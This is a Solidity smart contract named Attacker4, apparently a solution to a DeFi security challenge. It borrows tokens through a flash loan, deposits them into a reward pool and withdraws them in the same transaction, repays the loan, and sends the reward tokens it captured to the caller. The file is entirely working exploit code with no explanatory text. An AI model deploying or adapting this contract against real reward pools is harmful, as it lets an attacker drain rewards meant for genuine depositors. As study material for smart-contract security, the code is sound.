// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewarder {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface ILender {
    function flashLoan(uint256 amount) external;
}

contract Attacker4 {
    IRewarder rewarder;
    ILender lender;
    IERC20 token;
    IERC20 rewardToken;

    constructor(address _rewarder, address _lender, address _token, address _rewardToken) {
        rewarder = IRewarder(_rewarder);
        lender = ILender(_lender);
        token = IERC20(_token);
        rewardToken = IERC20(_rewardToken);
    }

    function exploit(uint256 amount) public {
        lender.flashLoan(amount);

        uint256 contractBal = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, contractBal);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);

        rewarder.deposit(amount);
        rewarder.withdraw(amount);

        token.transfer(msg.sender, amount);
    }
}